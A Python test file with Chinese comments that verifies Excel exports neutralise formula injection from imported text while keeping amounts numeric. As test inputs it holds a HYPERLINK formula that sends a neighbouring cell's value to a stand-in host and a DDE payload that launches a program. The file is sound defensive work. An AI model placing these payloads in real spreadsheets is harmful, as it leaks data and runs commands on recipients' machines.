"""导出/模板的 Excel 公式注入防护（2026-10-09）。

背景：openpyxl 给单元格赋**以 `=` 开头**的字符串时会把它标成公式。本系统的
设备型号、明细名称、备注、客户名大量来自"导入"（含甲方与供应商给的 Excel），
等于把不受控文本送进 Excel 的公式解析器——用户双击打开导出件就会真的求值。

这里守的性质是两条：
1. 导出件里**不能出现任何公式单元格**（xlsx 的 `<f>` 标签数为 0）；
2. **内容不能被改写**（不能靠插单引号之类的手段"看起来安全了"）。
"""

from __future__ import annotations

import zipfile
from io import BytesIO

from openpyxl import Workbook, load_workbook
from openpyxl.styles import Alignment

from app.services.export_data import (
    ExportContext,
    ExportFeeRow,
    ExportItemRow,
    ExportMeta,
    ExportSubsystemRow,
)

# 私有的写入助手就是**被测对象本身** ✓（加固正是加在这两个函数里 ✓）——
# 直接钉住它们，才能逐格核对"类型 + 值"，而不是只跑一条恰好覆盖到的路径 ✓。
from app.services.export_excel import _put, _put_text, render
from app.services.xlsx_safe import append_row, harden, looks_dangerous

# 典型载荷：把旁边单元格的内容带出去
DANGER = '=HYPERLINK("http://example.invalid/?"&A1,"点我")'
DDE = "=cmd|'/c calc'!A0"


def _meta(**kw) -> ExportMeta:
    base = {
        "quote_code": "QT-202610-0001",
        "title": "智能化弱电工程报价单",
        "version_label": "2026-10-09 14:00:00",
        "status_label": "草稿",
        "project_code": "PRJ-202610-0001",
        "project_name": "某项目",
        "customer_name": "某某公司",
        "customer_contact": "张工",
        "customer_phone": "13800000000",
        "address": "宁波市",
        "tax_method_label": "一般计税 9%",
        "tax_rate_pct": "9%",
        "generated_at": "2026-10-09 14:00",
        "include_cost": False,
    }
    base.update(kw)
    return ExportMeta(**base)


def _ctx() -> ExportContext:
    return ExportContext(
        meta=_meta(title=DANGER, company_name=DDE, project_name="=1+1"),
        fees=[ExportFeeRow("设备费", "100.00", "")],
        subsystems=[ExportSubsystemRow(1, DANGER, "1", "100.00", "0.00", "0.00", "100.00")],
        items=[
            ExportItemRow(1, DANGER, DANGER, "@SUM(1:1)", "-2+3", "台",
                          "1", "100.00", "100.00", DDE, DDE),
        ],
    )


def _formula_count(blob: bytes) -> int:
    """整个工作簿里 `<f>`（公式单元格）的数量。"""
    with zipfile.ZipFile(BytesIO(blob)) as z:
        return sum(
            z.read(name).decode("utf-8").count("<f>")
            for name in z.namelist()
            if name.startswith("xl/worksheets/") and name.endswith(".xml")
        )


# ---------------------------------------------------------------------------
# 单元：xlsx_safe
# ---------------------------------------------------------------------------

def test_looks_dangerous_only_flags_leading_meta_chars() -> None:
    assert looks_dangerous("=1+1")
    assert looks_dangerous("+1")
    assert looks_dangerous("-1")
    assert looks_dangerous("@cmd")
    assert not looks_dangerous("DS-2CD1321")      # 短横线不在开头，不算
    assert not looks_dangerous("")
    assert not looks_dangerous(100)               # 数值一律安全
    assert not looks_dangerous(None)


def test_append_row_forces_text_and_keeps_content() -> None:
    wb = Workbook()
    ws = wb.active
    append_row(ws, [DANGER, DDE, "普通型号", 100])
    cells = ws[1]
    assert all(c.data_type != "f" for c in cells)
    assert cells[0].value == DANGER              # 内容原样，没插单引号
    assert cells[3].value == 100


def test_harden_leaves_safe_cells_alone() -> None:
    wb = Workbook()
    ws = wb.active
    c = ws.cell(row=1, column=1, value="普通")
    harden(c)
    assert c.data_type == "s"


# ---------------------------------------------------------------------------
# 集成：报价单导出
# ---------------------------------------------------------------------------

def test_quote_export_contains_no_formula_cells() -> None:
    blob = render(_ctx())
    assert _formula_count(blob) == 0

    # 内容必须原样：不能靠"加单引号"把公式压成文本
    wb = load_workbook(BytesIO(blob))
    found = {
        str(cell.value)
        for ws in wb.worksheets
        for row in ws.iter_rows()
        for cell in row
        if cell.value is not None
    }
    assert DANGER in found
    assert DDE in found


def test_quote_export_still_writes_numbers_as_numbers() -> None:
    """防注入不能把金额也降级成文本（甲方要能在 Excel 里求和）。"""
    wb = load_workbook(BytesIO(render(_ctx())))
    amounts = [
        cell.value
        for ws in wb.worksheets
        for row in ws.iter_rows()
        for cell in row
        if isinstance(cell.value, (int, float)) and cell.value not in (0, 1, 2, 3)
    ]
    assert amounts, "导出件里应当有数字单元格（金额）"


# ---------------------------------------------------------------------------
# 集成：设备库导出（走 append_row 的那条链路）
# ---------------------------------------------------------------------------

async def test_device_export_has_no_formula_cells(client, admin_headers, devices, db) -> None:
    """设备名是外来文本，导出时不能被 Excel 当公式。"""
    devices[0].name = DANGER
    await db.commit()

    resp = await client.get("/api/v1/devices/export.xlsx", headers=admin_headers)
    assert resp.status_code == 200, resp.text
    assert _formula_count(resp.content) == 0

    wb = load_workbook(BytesIO(resp.content))
    values = {
        str(cell.value)
        for ws in wb.worksheets
        for row in ws.iter_rows()
        for cell in row
        if cell.value is not None
    }
    assert DANGER in values, "设备名必须原样落进表格"


# ---------------------------------------------------------------------------
# ★ 加固**不能误伤正常内容**（2026-10-09 追加，随"公司抬头"一批一起提交）
# ---------------------------------------------------------------------------

# (原始文本, _put 后的值, _put 后的类型, _put_text 后的值, _put_text 后的类型, 说明)
_TYPE_MATRIX: list[tuple[str, object, str, object, str, str]] = [
    ("1234.56", 1234.56, "n", "1234.56", "s", "数字文本"),
    ("12%", 0.12, "n", "12%", "s", "百分比"),
    ("-100.50", -100.5, "n", "-100.50", "s", "负数字符串（- 是危险前缀，最易误伤）"),
    ("2026-10-09", "2026-10-09", "s", "2026-10-09", "s", "日期样文本"),
    ("DS-2CD1321", "DS-2CD1321", "s", "DS-2CD1321", "s", "型号（短横线在中间）"),
    ("", None, "n", None, "n", "空串 → 真空单元格"),
    ("   ", None, "n", "   ", "s", "纯空白"),
    ("=1+1", "=1+1", "s", "=1+1", "s", "危险：公式"),
    ("+86 13800000000", "+86 13800000000", "s", "+86 13800000000", "s", "危险前缀 +"),
    ("@备注", "@备注", "s", "@备注", "s", "危险前缀 @"),
    ("-待定", "-待定", "s", "-待定", "s", "危险前缀 -"),
]


def test_hardening_does_not_harm_normal_types_or_values() -> None:
    """★ 逐格核对**类型 + 值**：加固只该把"危险前缀开头的**文本**"改成文本型。

    这里是最容易被后人改坏的地方：图省事把 `harden` 写成"给所有字符串加前缀"✗
    → 金额变成文本，甲方就没法在 Excel 里求和 ✗。
    所以每一种入参都钉死类型 ✓，尤其 `-100.50` ✓：
    `-` 在危险前缀表里，但 `_num()` 已经先把它转成了 **float** ✓，
    而 `harden` 只判**字符串** ⇒ 数字**不会被误伤** ✓。
    """
    wb = Workbook()
    ws = wb.active
    for i, (raw, *_rest) in enumerate(_TYPE_MATRIX, start=1):
        _put(ws, i, 1, text=raw, fmt="0.00", align=Alignment())
        _put_text(ws, i, 2, raw)

    for i, (_raw, pv, pt, tv, tt, desc) in enumerate(_TYPE_MATRIX, start=1):
        a, b = ws.cell(row=i, column=1), ws.cell(row=i, column=2)
        assert a.value == pv, f"[{desc}] _put 的值被改坏了：{a.value!r} != {pv!r}"
        assert a.data_type == pt, f"[{desc}] _put 的类型不对：{a.data_type!r} != {pt!r}"
        assert b.value == tv, f"[{desc}] _put_text 的值被改坏了：{b.value!r} != {tv!r}"
        assert b.data_type == tt, f"[{desc}] _put_text 的类型不对：{b.data_type!r} != {tt!r}"


def test_real_export_keeps_amounts_numeric_and_escapes_only_dangerous_text() -> None:
    """端到端（真走 render）：金额仍是**数字**，危险文本被强制成**文本型**且值不变。"""
    blob = render(_ctx())
    wb = load_workbook(BytesIO(blob))

    amounts = [
        c.value
        for ws in wb.worksheets for row in ws.iter_rows() for c in row
        if isinstance(c.value, (int, float))
    ]
    assert amounts, "导出件里应当有数字单元格（金额）✓"
    # 样例里"100.00"这笔必须**仍是数字**（不是被加固加前缀变成的字符串 ✗）
    assert any(float(v) == 100.0 for v in amounts), f"金额没有被写成数字：{amounts}"

    dangerous = [
        (ws.title, c.coordinate, c.value, c.data_type)
        for ws in wb.worksheets for row in ws.iter_rows() for c in row
        if isinstance(c.value, str) and c.value[:1] in ("=", "+", "-", "@", "\t", "\r")
    ]
    assert dangerous, "样例里放了危险前缀文本，应当能在导出件里找到"
    for title, coord, value, dtype in dangerous:
        assert dtype == "s", f"{title}!{coord} 仍是公式型：{value!r} / {dtype!r}"
    # 值必须**原样**：不能靠插单引号"看起来安全了"✗
    assert any(v == DANGER for *_x, v, _d in dangerous), dangerous
    assert any(v == DDE for *_x, v, _d in dangerous), dangerous


def test_company_contact_row_is_added_without_shifting_the_sheet() -> None:
    """抬头联系方式落在**本来空着的第 3 行** ✓ —— 不往下挪任何东西 ✓（2026-10-09）。"""
    ws = load_workbook(BytesIO(render(_ctx())))["报价汇总"]
    assert ws.cell(row=2, column=1).value == DDE          # A2 仍是公司名 ✓
    # A3 = 地址　电话　邮箱（样例里只给了公司名 → 三项为空 → 整行不写 ✓）
    assert ws.cell(row=3, column=1).value in (None, ""), ws.cell(row=3, column=1).value
    # info 表仍从第 4 行开始 ✓（没被新行挤下去 ✓）
    assert ws.cell(row=4, column=1).value == "报价单号", ws.cell(row=4, column=1).value
